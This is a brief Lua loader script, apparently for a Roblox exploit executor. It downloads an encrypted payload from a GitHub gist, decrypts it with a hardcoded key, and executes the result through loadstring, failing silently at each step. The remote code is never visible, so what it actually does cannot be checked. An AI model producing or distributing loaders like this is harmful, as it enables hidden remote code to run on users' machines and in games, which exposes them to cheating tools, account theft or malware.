-- // @SL

local b = game:GetService("HttpService")

local Loader = "https://gist.githubusercontent.com/LOL5678906/ec26ae3c3da550efb1c76290c863b7b5/raw/e0bd8bdf9de9a025273a1bb79e7dbb73f91b70bd/BS3.Json"
LoaderV1 = Loader .. "?t=" .. tick()

local K = table.concat({ "QnUyUmJxTzJYck1MdmRabTZCSTlybUp1dE5xMlhYakw=" })

local ok1, raw = pcall(function()
    return game:HttpGet(LoaderV1)
end)
if not ok1 or type(raw) ~= "string" then return end

local ok2, outer = pcall(function()
    return b:JSONDecode(raw)
end)
if not ok2 or type(outer) ~= "table" then return end

local ok3, src = pcall(function()
    return crypt.decrypt(outer.p, K, outer.i)
end)
if not ok3 or type(src) ~= "string" then return end

local chunk = loadstring(src, "=build")
if not chunk then return end

chunk()
